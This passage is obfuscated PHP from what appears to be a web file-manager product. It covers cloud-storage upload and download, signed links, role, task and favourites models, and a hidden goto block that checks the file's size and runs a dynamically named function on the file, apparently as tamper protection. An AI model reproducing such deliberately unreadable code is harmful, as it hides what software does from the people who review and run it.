$ğÈ£´Ä­[$ıÏôÀ·ü[1198]] ? $this->getPathOuter($çÀ‘€ø) : !1; } private function uploadPart($Ÿ±øú, $¬ÎÁ×¯µ, &$ •ÏÂÍ) { $‰¬»¨í =& $_SERVER[ñˆ‹ß¿÷]; $µÏÎïáÍ = array($‰¬»¨í[1491], $‰¬»¨í[1489] . $¬ÎÁ×¯µ[$‰¬»¨í[1490]], $‰¬»¨í[1492] . $¬ÎÁ×¯µ[$‰¬»¨í[1486]], $‰¬»¨í[142] . $¬ÎÁ×¯µ[$‰¬»¨í[1487]]); $•ÏÏÕØç = $this->ussRequest($Ÿ±øú, $‰¬»¨í[228], $ •ÏÂÍ, $µÏÎïáÍ); return !$•ÏÏÕØç[$‰¬»¨í[1198]] ? $•ÏÏÕØç[$‰¬»¨í[1198]] : $•ÏÏÕØç[$‰¬»¨í[1200]]; } public function uploadFormData($Üõ“Úš€, $«ªâçî¤ = 3600) { return $this->uploadPolicy($Üõ“Úš€, $«ªâçî¤); } public function multiUploadFormData($ÃÌïå¥á, $¤ÕáàÑƒ = 3600) { $ì‰ø¤“˜ =& $_SERVER[ñˆ‹ß¿÷]; $ŒÁÏÊš = (int) $GLOBALS[$ì‰ø¤“˜[7]][$ì‰ø¤“˜[76]]; return $this->uploadPolicy($ÃÌïå¥á, $¤ÕáàÑƒ, $ŒÁÏÊš); } private function uploadPolicy($á‡®¦øÂ, $ò±ÎÎš´ = 3600, $¤– Óƒš = 0) { $ğ×“Î« =& $_SERVER[ñˆ‹ß¿÷]; $„†­Èİ¯ = $ğ×“Î«[8] . $this->bucket; $Öª”Äù² = gmdate($ğ×“Î«[1426]); $ÉİËïÆî = array($ğ×“Î«[1493] => $this->bucket, $ğ×“Î«[1494] => $á‡®¦øÂ, $ğ×“Î«[1495] => time() + $ò±ÎÎš´, $ğ×“Î«[1496] => $Öª”Äù²); if ($¤– Óƒš) { $ÉİËïÆî[$ğ×“Î«[1406]] = $¤– Óƒš; } $äİê—è = base64_encode(json_encode($ÉİËïÆî)); $É¶¦ÓÁ¢ = base64_encode(hash_hmac($ğ×“Î«[1463], "\120\117\123\x54\x26{$„†­Èİ¯}\x26{$Öª”Äù²}\x26{$äİê—è}", md5("{$this->userpass}"), !0)); $­­©Ë‚ = array($ğ×“Î«[1329] => $äİê—è, $ğ×“Î«[1497] => "\125\x50\x59\125\x4e\x20{$this->username}\x3a{$É¶¦ÓÁ¢}", $ğ×“Î«[181] => $this->endpoint . $„†­Èİ¯); return $­­©Ë‚; } public function download($Äö˜ôÜ«, $à¸ÅŒ¿ş) { $³¼áˆì± = IO::getPathInner(IO::mkfile($à¸ÅŒ¿ş)); if (!($×²´ÃÅ› = $this->link($Äö˜ôÜ«))) { return !1; } $¨é¬¨­“ = 0; $ÄŸƒÒ… = 1024 * 200; $ÒÍ›¼ë¿ = fopen($³¼áˆì±, $_SERVER[ñˆ‹ß¿÷][1447]); while (!0) { $÷ÂÏÌÓå = $this->fileSubstr($Äö˜ôÜ«, $¨é¬¨­“, $ÄŸƒÒ…); if ($÷ÂÏÌÓå === !1) { return !1; } fwrite($ÒÍ›¼ë¿, $÷ÂÏÌÓå); $¨é¬¨­“ += $ÄŸƒÒ…; if (strlen($÷ÂÏÌÓå) < $ÄŸƒÒ…) { break; } } fclose($ÒÍ›¼ë¿); return $à¸ÅŒ¿ş; } public function link($¼É°æàÎ, $šÒ·ç¥Ş = array()) { $›ç¤Ü =& $_SERVER[ñˆ‹ß¿÷]; $¼É°æàÎ = trim($¼É°æàÎ, $›ç¤Ü[8]); if (!empty($this->token)) { $­ö‚›’  = strtotime(date($›ç¤Ü[1498])); $ûíóù¥ = substr(md5($this->token . $›ç¤Ü[284] . $­ö‚›’  . $›ç¤Ü[1499] . $¼É°æàÎ), 12, 8) . $­ö‚›’ ; $šÒ·ç¥Ş[] = $›ç¤Ü[1500] . $ûíóù¥; } $×µÎ¿–Í = !empty($šÒ·ç¥Ş) ? $›ç¤Ü[73] . implode($›ç¤Ü[284], $šÒ·ç¥Ş) : $›ç¤Ü[12]; return $this->getHost() . $›ç¤Ü[8] . $¼É°æàÎ . $×µÎ¿–Í; } public function fileOut($®³éšè¾, $—¨öÜÀª = false, $ËÈ‘´ÖÊ = false, $‹¹à”û¥ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($®³éšè¾, $—¨öÜÀª, $ËÈ‘´ÖÊ, $‹¹à”û¥); } if (!$ËÈ‘´ÖÊ) { $ËÈ‘´ÖÊ = $this->pathThis($®³éšè¾); } $õİ˜›øœ = $—¨öÜÀª ? array($_SERVER[ñˆ‹ß¿÷][1501] . rawurlencode($ËÈ‘´ÖÊ)) : array(); $ß×¾ù°› = $this->link($®³éšè¾, $õİ˜›øœ); $this->fileOutLink($ß×¾ù°›); } public function fileOutServer($¬¹Ï Â, $ë’Á í = false, $Œ™±¬˜ = false, $’Œ”ÕäÌ = '') { parent::fileOut($¬¹Ï Â, $ë’Á í, $Œ™±¬˜, $’Œ”ÕäÌ); } public function fileOutImage($ÈÖ÷–Ì, $Ö™ö»‚ = 250) { $Ğ€Ê§É¬ = $this->link($ÈÖ÷–Ì . $_SERVER[ñˆ‹ß¿÷][1502] . $Ö™ö»‚); $this->fileOutLink($Ğ€Ê§É¬); } public function fileOutImageServer($À¯”ü¸„, $ì®®ê‘„ = 250) { parent::fileOutImage($À¯”ü¸„, $ì®®ê‘„); } public function hashMd5($ ·ÙÃæ) { $Ûƒ‹Æ¥ =& $_SERVER[ñˆ‹ß¿÷]; $´Öì¾ì = $this->_objectMeta($ ·ÙÃæ); return isset($´Öì¾ì[$Ûƒ‹Æ¥[212]]) ? $´Öì¾ì[$Ûƒ‹Æ¥[212]] : !1; } public function size($¥‡À¦°ö) { $ò¹ÌÄú = $this->objectMeta($¥‡À¦°ö); return $ò¹ÌÄú ? $ò¹ÌÄú[$_SERVER[ñˆ‹ß¿÷][76]] : 0; } public function info($Æ²ÈÈéİ) { if ($this->isFolder($Æ²ÈÈéİ)) { return $this->folderInfo($Æ²ÈÈéİ); } else { if ($this->isFile($Æ²ÈÈéİ)) { return $this->fileInfo($Æ²ÈÈéİ); } } return !1; } public function exist($–·ùÆ¨”) { return $this->isFile($–·ùÆ¨”) || $this->isFolder($–·ùÆ¨”); } public function isFile($†¦ÔéáŸ) { return !$this->isFolder($†¦ÔéáŸ) && $this->objectMeta($†¦ÔéáŸ); } public function isFolder($Áó‹¾ƒ) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][165], $Áó‹¾ƒ); } protected function objectMeta($€˜à»Ôì) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][167], $€˜à»Ôì); } protected function _objectMeta($ì Ìƒù) { $Ùäíçòì =& $_SERVER[ñˆ‹ß¿÷]; if ($ì Ìƒù == $Ùäíçòì[12] || $ì Ìƒù == $Ùäíçòì[8]) { return array(); } $§È€¶¢ = $this->ussRequest($ì Ìƒù, $Ùäíçòì[1503]); if (!$§È€¶¢[$Ùäíçòì[1198]]) { return null; } $ï“ç»ĞÛ = isset($§È€¶¢[$Ùäíçòì[1200]]) ? $§È€¶¢[$Ùäíçòì[1200]] : array(); if (!isset($ï“ç»ĞÛ[$Ùäíçòì[1504]])) { return null; } $”ß½˜ö¿ = array($Ùäíçòì[33] => isset($ï“ç»ĞÛ[$Ùäíçòì[1504]]) ? $ï“ç»ĞÛ[$Ùäíçòì[1504]] : null, $Ùäíçòì[76] => isset($ï“ç»ĞÛ[$Ùäíçòì[1505]]) ? $ï“ç»ĞÛ[$Ùäíçòì[1505]] : null, $Ùäíçòì[212] => isset($ï“ç»ĞÛ[$Ùäíçòì[1506]]) ? $ï“ç»ĞÛ[$Ùäíçòì[1506]] : null, $Ùäíçòì[1473] => isset($ï“ç»ĞÛ[$Ùäíçòì[1507]]) ? $ï“ç»ĞÛ[$Ùäíçòì[1507]] : null); $”ß½˜ö¿[$Ùäíçòì[1474]] = isset($ï“ç»ĞÛ[$Ùäíçòì[1508]]) ? strtotime($ï“ç»ĞÛ[$Ùäíçòì[1508]]) : $”ß½˜ö¿[$Ùäíçòì[1473]]; return $”ß½˜ö¿; } protected function _isFolder($ŞßÆšà) { $ˆá„õ…œ =& $_SERVER[ñˆ‹ß¿÷]; if ($ŞßÆšà == $ˆá„õ…œ[12] || $ŞßÆšà == $ˆá„õ…œ[8]) { return !0; } $âáİûåé = $this->_objectMeta($ŞßÆšà); return isset($âáİûåé[$ˆá„õ…œ[33]]) && $âáİûåé[$ˆá„õ…œ[33]] == $ˆá„õ…œ[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ñıú–Ü¼ = false) { } public function exist($¤ÂİæÅê) { $„ûúÜº = $this->info($¤ÂİæÅê); return $„ûúÜº[$_SERVER[ñˆ‹ß¿÷][201]]; } public function isFile($º×üö©Ø) { $í ô¾ = $this->info($º×üö©Ø); return $í ô¾[$_SERVER[ñˆ‹ß¿÷][201]]; } public function isFolder($ï²Â˜‚) { return !1; } public function size($‚Æ¼œÉ©) { $®£îÅñü = $this->info($‚Æ¼œÉ©); return $®£îÅñü[$_SERVER[ñˆ‹ß¿÷][76]]; } public function info($ÕŞÄìÙù) { return $this->infoParse($ÕŞÄìÙù); } public function infoAuth($¯á—™½œ) { return $this->infoParse($¯á—™½œ); } public function infoWithChildren($”Ë‹ÜÚ) { return $this->infoParse($”Ë‹ÜÚ); } public function infoFull($ÅõÜ³¡Â) { return $this->infoParse($ÅõÜ³¡Â); } private function infoParse($ÍÉËËğ°) { $©Óİ°í‡ =& $_SERVER[ñˆ‹ß¿÷]; $“â¸½Àı = $this->header($ÍÉËËğ°); if (!$“â¸½Àı || !$“â¸½Àı[$©Óİ°í‡[757]]) { return !1; } $¬‚‰“Í½ = _get($“â¸½Àı, $©Óİ°í‡[337], 0); $ªœ¸–ö = array($©Óİ°í‡[32] => $“â¸½Àı[$©Óİ°í‡[32]], $©Óİ°í‡[84] => $ÍÉËËğ°, $©Óİ°í‡[33] => $©Óİ°í‡[199], $©Óİ°í‡[76] => intval($¬‚‰“Í½), $©Óİ°í‡[174] => get_path_ext($“â¸½Àı[$©Óİ°í‡[32]]), $©Óİ°í‡[1387] => $¬‚‰“Í½ > 0 && $“â¸½Àı[$©Óİ°í‡[1509]], $©Óİ°í‡[1388] => !1); return $ªœ¸–ö; } private function header($‹Ïç±èå) { $¦°–ÜÈİ =& $_SERVER[ñˆ‹ß¿÷]; if (isset(self::$_cacheHeader[$‹Ïç±èå])) { return self::$_cacheHeader[$‹Ïç±èå]; } $èÃ÷Ÿ« = isset($GLOBALS[$¦°–ÜÈİ[1510]]) ? $GLOBALS[$¦°–ÜÈİ[1510]] : !1; $GLOBALS[$¦°–ÜÈİ[1510]] = !0; self::$_cacheHeader[$‹Ïç±èå] = url_header($‹Ïç±èå); $GLOBALS[$¦°–ÜÈİ[1510]] = $èÃ÷Ÿ«; return self::$_cacheHeader[$‹Ïç±èå]; } public function hashSimple($¶ÛÑÑô, $ø·êœµ = false) { $€Èëı’ =& $_SERVER[ñˆ‹ß¿÷]; $Îå™Ò€æ = $this->info($¶ÛÑÑô); if (!$Îå™Ò€æ || !$Îå™Ò€æ[$€Èëı’[201]]) { return !1; } $„â±›î = $Îå™Ò€æ[$€Èëı’[76]]; $¾©á¶È‰ = 200; $¨Ìıò£å = 50; if ($„â±›î <= $¾©á¶È‰ * $¨Ìıò£å) { return md5($this->fileSubstr($¶ÛÑÑô, 0, $„â±›î)) . $„â±›î; } $óï÷ïû£ = intval($„â±›î / $¨Ìıò£å); $ÎÛåËÍƒ = $€Èëı’[12]; $–‚Å×°û = timeFloat(); $“ë´ÓÓ³ = 15; for ($óÚÎš™ = 0; $óÚÎš™ < $¨Ìıò£å; $óÚÎš™++) { if (timeFloat() - $–‚Å×°û > $“ë´ÓÓ³) { return !1; } $äşƒ×Öì = $this->fileSubstr($¶ÛÑÑô, $óï÷ïû£ * $óÚÎš™, $¾©á¶È‰); if (!$äşƒ×Öì) { return !1; } $ÎÛåËÍƒ .= $äşƒ×Öì; } $ÎÛåËÍƒ .= $this->fileSubstr($¶ÛÑÑô, $„â±›î - $¾©á¶È‰, $¾©á¶È‰); return md5($ÎÛåËÍƒ) . $„â±›î; } public function getContent($Ù·ğ‚î) { return $this->fileSubstr($Ù·ğ‚î); } public function fileSubstr($¥ì€ø—, $ó¤ôúş = 0, $Ô¿« õ‘ = -1) { $ş‹ŸÏ¨Ÿ =& $_SERVER[ñˆ‹ß¿÷]; $ˆ­ÇÕ­Í = $this->info($¥ì€ø—); if (!$ˆ­ÇÕ­Í || !$ˆ­ÇÕ­Í[$ş‹ŸÏ¨Ÿ[201]] && $ˆ­ÇÕ­Í[$ş‹ŸÏ¨Ÿ[76]] > 1024 * 1024 * 10) { return !1; } if ($Ô¿« õ‘ === -1) { $Ô¿« õ‘ = $ˆ­ÇÕ­Í[$ş‹ŸÏ¨Ÿ[76]]; } if ($Ô¿« õ‘ == 0) { return $ş‹ŸÏ¨Ÿ[12]; } $ŞæÙŸı = array($ş‹ŸÏ¨Ÿ[1511] . $ó¤ôúş . $ş‹ŸÏ¨Ÿ[789] . ($ó¤ôúş + $Ô¿« õ‘ - 1)); $ö•Ø«‰š = url_request($¥ì€ø—, $ş‹ŸÏ¨Ÿ[230], !1, $ŞæÙŸı, !1, !1, 1); return $ö•Ø«‰š[$ş‹ŸÏ¨Ÿ[1200]] ? $ö•Ø«‰š[$ş‹ŸÏ¨Ÿ[1200]] : $ş‹ŸÏ¨Ÿ[12]; } public function download($ÒÍïŸ›®, $­µêô­°) { Downloader::start($ÒÍïŸ›®, $­µêô­°); return $­µêô­°; } } goto DŠ×ƒÄĞ…Ä; AÇÁ¬õÇç: define($_SERVER[ñˆ‹ß¿÷][0], $_SERVER[ñˆ‹ß¿÷][1]); $_SERVER[Š½‰´ó] = explode($_SERVER[ñˆ‹ß¿÷][2], gzinflate(substr($_SERVER[ñˆ‹ß¿÷][3], 10, -8))); function binCheckEq($€”üŠÑ¼, $ÃÙŞÚÏ„) { return $€”üŠÑ¼ == $ÃÙŞÚÏ„; } goto fùºß†Š•Û; fÀ¶ìÑ¬¢: $_file = $_SERVER[$_SERVER[ñˆ‹ß¿÷][1344]]; $_size = $_SERVER[ñˆ‹ß¿÷][2145]; if ($_SERVER[$_SERVER[ñˆ‹ß¿÷][879]] != $_size($_file)) { $_getc = $_SERVER[ñˆ‹ß¿÷][882]; $_getfile = $_SERVER[$_SERVER[ñˆ‹ß¿÷][883]] . $_SERVER[ñˆ‹ß¿÷][884]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñˆ‹ß¿÷][231], $_getfilec); if (count($_getarrs) < $_SERVER[ñˆ‹ß¿÷][619]) { $exit = $_SERVER[ñˆ‹ß¿÷][885]; $exit(); } $_act = $_SERVER[ñˆ‹ß¿÷][1345]; $_act($_file); } goto EÍëº‚é÷¾; a»ã Ğùß: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\162\x6f\x6c\145\114\151\x73\164"; public $field = array("\x6e\x61\155\145", "\141\x75\x74\150", "\x6c\141\x62\x65\154", "\144\151\x73\160\x6c\x61\x79", "\x73\x79\163\164\145\x6d", "\144\x65\163\143", "\x69\147\156\x6f\x72\145\105\x78\x74", "\x69\147\156\x6f\162\x65\x46\151\154\145\x53\151\x7a\x65", "\x61\144\x6d\151\x6e\x69\x73\164\x72\141\164\x6f\x72", "\x73\x6f\x72\x74"); public function listData($Ë‰ŸÌğ = false, $æ¥÷šŞŠ = "\163\x6f\162\x74", $ÌşÓˆã¥ = false) { $øúå€Ÿ =& $_SERVER[ñˆ‹ß¿÷]; $Š³÷Ş‘Ğ = parent::listData($Ë‰ŸÌğ, $æ¥÷šŞŠ, $ÌşÓˆã¥); if (!$Ë‰ŸÌğ) { foreach ($Š³÷Ş‘Ğ as $® ÌàË => $²èŠÑŞ) { if ($²èŠÑŞ[$øúå€Ÿ[2034]] == 1) { $Š³÷Ş‘Ğ[$® ÌàË][$øúå€Ÿ[453]] = LNG($øúå€Ÿ[2269]); } } } return $Š³÷Ş‘Ğ; } public function update($³’ôÚÕò, $­ë§ì¤Ÿ) { $âŒÆ«‚» =& $_SERVER[ñˆ‹ß¿÷]; $ºœñü½Ğ = parent::listData($³’ôÚÕò); $æ¦ïƒÊ = $this->findByName($­ë§ì¤Ÿ[$âŒÆ«‚»[32]]); if (!$ºœñü½Ğ || $æ¦ïƒÊ && $æ¦ïƒÊ[$âŒÆ«‚»[399]] != $ºœñü½Ğ[$âŒÆ«‚»[399]]) { return !1; } if ($æ¦ïƒÊ[$âŒÆ«‚»[2034]] == 1) { $­ë§ì¤Ÿ = array($âŒÆ«‚»[32] => $­ë§ì¤Ÿ[$âŒÆ«‚»[32]], $âŒÆ«‚»[1859] => $­ë§ì¤Ÿ[$âŒÆ«‚»[1859]]); } $this->filterAuth($­ë§ì¤Ÿ[$âŒÆ«‚»[413]]); return parent::update($³’ôÚÕò, $­ë§ì¤Ÿ); } public function remove($ƒæ¦ÒÊŠ) { $ÉÌçÕæÂ = parent::listData($ƒæ¦ÒÊŠ); if (!$ÉÌçÕæÂ || $ÉÌçÕæÂ[$_SERVER[ñˆ‹ß¿÷][1283]]) { return !1; } return parent::remove($ƒæ¦ÒÊŠ); } public function add($Üé°š£Õ) { $¢¯ÏÛ ù =& $_SERVER[ñˆ‹ß¿÷]; $†ÙÄñÌâ = $Üé°š£Õ[$¢¯ÏÛ ù[32]]; if ($this->findByName($†ÙÄñÌâ)) { return !1; } $ñŸƒúãª = array($¢¯ÏÛ ù[420] => $†ÙÄñÌâ, $¢¯ÏÛ ù[1842] => $¢¯ÏÛ ù[12], $¢¯ÏÛ ù[1838] => $¢¯ÏÛ ù[1846], $¢¯ÏÛ ù[2270] => 1, $¢¯ÏÛ ù[1841] => 0, $¢¯ÏÛ ù[2271] => 0, $¢¯ÏÛ ù[1840] => $this->getSort()); $Üé°š£Õ = array_merge($ñŸƒúãª, $Üé°š£Õ); $this->filterAuth($Üé°š£Õ[$¢¯ÏÛ ù[413]]); return parent::insert($Üé°š£Õ); } private function getSort() { $øş¾®ãœ =& $_SERVER[ñˆ‹ß¿÷]; $‰£¨Ò² = parent::listData(); $ùŒ¯ÊÏæ = array_to_keyvalue($‰£¨Ò², $øş¾®ãœ[12], $øş¾®ãœ[1860]); return empty($ùŒ¯ÊÏæ) ? 0 : max($ùŒ¯ÊÏæ) + 1; } private function filterAuth(&$òù°ÛùÇ) { $²÷ã”»› =& $_SERVER[ñˆ‹ß¿÷]; $›…æÆıÑ = array(); $ÎĞ¢³ãœ = array_filter(explode($²÷ã”»›[50], $òù°ÛùÇ)); foreach ($ÎĞ¢³ãœ as $òù°ÛùÇ) { $š­”¸³¬ = explode($²÷ã”»›[10], $òù°ÛùÇ); if ($š­”¸³¬[0] == $²÷ã”»›[2272] && $š­”¸³¬[1] != $²÷ã”»›[1202]) { $Ù–ŠŸ…ğ = $š­”¸³¬[0] . $²÷ã”»›[10] . $š­”¸³¬[1] . $²÷ã”»›[2273]; if (!in_array($Ù–ŠŸ…ğ, $ÎĞ¢³ãœ)) { $›…æÆıÑ[] = $Ù–ŠŸ…ğ; } } $›…æÆıÑ[] = $òù°ÛùÇ; } $òù°ÛùÇ = implode($²÷ã”»›[50], $›…æÆıÑ); } public function findRoleDefault() { $¡Ì‰âÔœ =& $_SERVER[ñˆ‹ß¿÷]; $óÌñ­ƒ = parent::listData(); $’¢ÖŠ‹† = !1; foreach ($óÌñ­ƒ as $šòÏŞÑŞ) { if (!$šòÏŞÑŞ || $šòÏŞÑŞ[$¡Ì‰âÔœ[1858]] == $¡Ì‰âÔœ[197] || $šòÏŞÑŞ[$¡Ì‰âÔœ[2034]] == 1) { continue; } if (strstr($šòÏŞÑŞ[$¡Ì‰âÔœ[413]], $¡Ì‰âÔœ[2274])) { continue; } if (!strstr($šòÏŞÑŞ[$¡Ì‰âÔœ[413]], $¡Ì‰âÔœ[2275])) { continue; } if (!$’¢ÖŠ‹†) { $’¢ÖŠ‹† = $šòÏŞÑŞ; continue; } $ÀåÛÃ«Î = explode($¡Ì‰âÔœ[50], $’¢ÖŠ‹†[$¡Ì‰âÔœ[413]]); $çıÍ³Ÿ = explode($¡Ì‰âÔœ[50], $šòÏŞÑŞ[$¡Ì‰âÔœ[413]]); if (count($ÀåÛÃ«Î) > count($çıÍ³Ÿ)) { $’¢ÖŠ‹† = $šòÏŞÑŞ; } } return $’¢ÖŠ‹† ? $’¢ÖŠ‹†[$¡Ì‰âÔœ[399]] : $¡Ì‰âÔœ[12]; } public function sort($Ûíˆ‚ÉÂ, $°‘œ€ù´) { return parent::update($Ûíˆ‚ÉÂ, $°‘œ€ù´); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\164\x61\x73\153\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\164\x79\160\x65", "\x65\x76\145\x6e\x74", "\164\x69\155\x65", "\x64\x65\163\x63", "\x73\171\163\x74\145\x6d", "\x65\156\141\x62\154\x65", "\154\141\163\164\x52\165\x6e", "\x73\157\162\164"); public function listData($Î¤Á´¶ = false, $“êÇŒ = "\163\157\x72\x74", $ÙµğŠ‚İ = false) { return parent::listData($Î¤Á´¶, $“êÇŒ, $ÙµğŠ‚İ); } public function add($×ê½·Ùª) { $Í¿Ş¡şˆ =& $_SERVER[ñˆ‹ß¿÷]; $ŠÔÀÉ¥Î = $this->findByName($×ê½·Ùª[$Í¿Ş¡şˆ[32]]); if ($ŠÔÀÉ¥Î) { return !1; } $×ê½·Ùª[$Í¿Ş¡şˆ[1624]] = 0; $×ê½·Ùª[$Í¿Ş¡şˆ[1860]] = $this->getSort(); return parent::insert($×ê½·Ùª); } private function getSort() { $ôŞ±¡’™ =& $_SERVER[ñˆ‹ß¿÷]; $’é˜ßíè = parent::listData(); $ğÓ» Èß = array_to_keyvalue($’é˜ßíè, $ôŞ±¡’™[12], $ôŞ±¡’™[1860]); return empty($ğÓ» Èß) ? 0 : max($ğÓ» Èß) + 1; } public function update($ßîÎš´‡, $ÀŞğ¼âæ) { $›×¯–¼î =& $_SERVER[ñˆ‹ß¿÷]; $Í‹Óåß’ = $this->listData($ßîÎš´‡); $¸›ÄŠÑà = $this->findByName($ÀŞğ¼âæ[$›×¯–¼î[32]]); if (!$Í‹Óåß’ || $¸›ÄŠÑà && $¸›ÄŠÑà[$›×¯–¼î[399]] != $Í‹Óåß’[$›×¯–¼î[399]]) { return !1; } return parent::update($ßîÎš´‡, $ÀŞğ¼âæ); } public function remove($“ıÂˆœç, $ş—°Àªç = false) { $‡Ç¼ÌÍú =& $_SERVER[ñˆ‹ß¿÷]; $ïğèªÑî = $this->listData($“ıÂˆœç); if (!$ïğèªÑî) { return; } if (!$ş—°Àªç && $ïğèªÑî[$‡Ç¼ÌÍú[1283]] == $‡Ç¼ÌÍú[88]) { return !1; } return parent::remove($“ıÂˆœç); } public function enable($ÕÏãÀ¥¦, $Ó—ßìì) { return $this->update($ÕÏãÀ¥¦, array($_SERVER[ñˆ‹ß¿÷][2264] => $Ó—ßìì)); } public function run($èÅ›¥ïŒ) { return $this->update($èÅ›¥ïŒ, array($_SERVER[ñˆ‹ß¿÷][2276] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($ºê¸¯‹ä) { $Èç¾±’¤ =& $_SERVER[ñˆ‹ß¿÷]; return array($Èç¾±’¤[1947] => array(USER_ID, $Èç¾±’¤[2277])); } protected function listData() { $¬÷Ò¿™ğ =& $_SERVER[ñˆ‹ß¿÷]; $í»ïƒÑ˜ = array($¬÷Ò¿™ğ[1655] => USER_ID, $¬÷Ò¿™ğ[484] => 0); $¬³¾›¤À = $¬÷Ò¿™ğ[2278]; $úêİáñ‘ = $this->field($¬³¾›¤À)->where($í»ïƒÑ˜)->order($¬÷Ò¿™ğ[2279])->select(); return $úêİáñ‘ ? $úêİáñ‘ : array(); } protected function resetCache() { } protected function listView() { $èËæø¾Ç =& $_SERVER[ñˆ‹ß¿÷]; $ÍÕÜ“Ş¤ = $this->listData(); $©‡·Î Š = array_filter_by_field($ÍÕÜ“Ş¤, $èËæø¾Ç[33], $èËæø¾Ç[416]); $¨µ©µ¬ş = array_to_keyvalue($©‡·Î Š, $èËæø¾Ç[12], $èËæø¾Ç[84]); if (!$¨µ©µ¬ş) { return $ÍÕÜ“Ş¤; } $­Á¬½•ô = 2000; $¨Ğşü = array($èËæø¾Ç[417] => array($èËæø¾Ç[418], $¨µ©µ¬ş)); $…Š½¯ õ = Model($èËæø¾Ç[832])->listSource($¨Ğşü, $­Á¬½•ô); $…Š½¯ õ = array_merge($…Š½¯ õ[$èËæø¾Ç[83]], $…Š½¯ õ[$èËæø¾Ç[82]]); $…Š½¯ õ = array_to_keyvalue($…Š½¯ õ, $èËæø¾Ç[402]); foreach ($ÍÕÜ“Ş¤ as $¦•Ö“‘ì => $ĞÓ™úóÎ) { $Â‹µ³ò÷ = $…Š½¯ õ[$ĞÓ™úóÎ[$èËæø¾Ç[84]]]; $Â‹µ³ò÷ = $Â‹µ³ò÷ ? $Â‹µ³ò÷ : array(); $ÍÕÜ“Ş¤[$¦•Ö“‘ì] = array_merge($Â‹µ³ò÷, $ĞÓ™úóÎ); } return $ÍÕÜ“Ş¤; } protected function addFav($ÇÊí¼Êİ, $çŒ¼ö°˜ = '', $à©ºÆ¬“ = "\163\x6f\165\x72\x63\145") { $‡ŒµÔâ =& $_SERVER[ñˆ‹ß¿÷]; $•³™ã = array($‡ŒµÔâ[1655] => USER_ID, $‡ŒµÔâ[484] => 0, $‡ŒµÔâ[422] => $à©ºÆ¬“, $‡ŒµÔâ[421] => $ÇÊí¼Êİ); if ($this->where($•³™ã)->find()) { return !1; } $•³™ã = array($‡ŒµÔâ[1655] => USER_ID, $‡ŒµÔâ[484] => 0); $åÏ¬¾½Ÿ = $this->where($•³™ã)->max($‡ŒµÔâ[1860]); if (!$åÏ¬¾½Ÿ) { $åÏ¬¾½Ÿ = 0; } if (!$çŒ¼ö°˜ && $à©ºÆ¬“ == $‡ŒµÔâ[416]) { $ÅÍ•ß†¤ = Model($‡ŒµÔâ[1334])->where(array($‡ŒµÔâ[417] => $ÇÊí¼Êİ))->find(); if (!$ÅÍ•ß†¤) { return !1; } $çŒ¼ö°˜ = $ÅÍ•ß†¤[$‡ŒµÔâ[32]]; } $çŒ¼ö°˜ = $this->getAutoName($çŒ¼ö°˜); $¬Ñ€ğ·ó = array($‡ŒµÔâ[1655] => USER_ID, $‡ŒµÔâ[484] => 0, $‡ŒµÔâ[420] => $çŒ¼ö°˜, $‡ŒµÔâ[421] => $ÇÊí¼Êİ, $‡ŒµÔâ[422] => $à©ºÆ¬“, $‡ŒµÔâ[1840] => $åÏ¬¾½Ÿ + 1); return $this->add($¬Ñ€ğ·ó); } protected function remove($ÊˆÓ‚š“) { $˜›ä“Şæ =& $_SERVER[ñˆ‹ß¿÷]; $®¬‘ÀÉó = array($˜›ä“Şæ[1655] => USER_ID, $˜›ä“Şæ[419] => $ÊˆÓ‚š“); return $this->where($®¬‘ÀÉó)->delete(); } protected function removeByName($òìò) { $¿Ğóí·½ =& $_SERVER[ñˆ‹ß¿÷]; $„¹·ıŞ÷ = array($¿Ğóí·½[1655] => USER_ID, $¿Ğóí·½[420] => $òìò, $¿Ğóí·½[484] => 0); return $this->where($„¹·ıŞ÷)->delete(); } protected function rename($¡»™†¥, $ğ¿Í‰ª¼) { $©…ºõç =& $_SERVER[ñˆ‹ß¿÷]; if ($¡»™†¥ == $ğ¿Í‰ª¼) { return !1; } $æìŠ®ˆí = $this->getAutoName($ğ¿Í‰ª¼); if ($ğ¿Í‰ª¼ != $æìŠ®ˆí) { return !1; } $¹ø×¬” = array($©…ºõç[1655] => USER_ID, $©…ºõç[484] => 0, $©…ºõç[32] => $¡»™†¥); return $this->where($¹ø×¬”)->save(array($©…ºõç[32] => $ğ¿Í‰ª¼)); } protected function resetSort($¬•…ÎÙ ) { $ü¯ ¥Ä =& $_SERVER[ñˆ‹ß¿÷]; $¬•…ÎÙ  = is_array($¬•…ÎÙ ) ? $¬•…ÎÙ  : array(); $êÒœúö = array($ü¯ ¥Ä[1655] => USER_ID); for ($ÂÑÂÄ—À = 0; $ÂÑÂÄ—À < count($¬•…ÎÙ ); $ÂÑÂÄ—À++) { $êÒœúö[$ü¯ ¥Ä[419]] = $¬•…ÎÙ [$ÂÑÂÄ—À]; $this->where($êÒœúö)->save(array($ü¯ ¥Ä[1840] => $ÂÑÂÄ—À + 1)); } return !0; } protected function moveTop($Ï®§ Ôµ) { $æš×ÑØÂ =& $_SERVER[ñˆ‹ß¿÷]; $ÔôşÁ = array($æš×ÑØÂ[1655] => USER_ID, $æš×ÑØÂ[484] => 0); $Ôşª÷áç = $this->where($ÔôşÁ)->where(array($æš×ÑØÂ[32] => $Ï®§ Ôµ))->find(); if (!$Ôşª÷áç) { return; } $Ôİ·êÕª = $this->field($æš×ÑØÂ[399])->where($ÔôşÁ)->order($æš×ÑØÂ[2279])->select(); $Ôİ·êÕª = array_to_keyvalue($Ôİ·êÕª, $æš×ÑØÂ[12], $æš×ÑØÂ[399]); $€£¶¾İ¯ = $Ôİ·êÕª; $Ôİ·êÕª = array_remove_value($Ôİ·êÕª, $Ôşª÷áç[$æš×ÑØÂ[399]]); array_unshift($Ôİ·êÕª, $Ôşª÷áç[$æš×ÑØÂ[399]]); return $this->resetSort($Ôİ·êÕª); } protected function moveBottom($«¾›Êìí) { $¯È—‡ä— =& 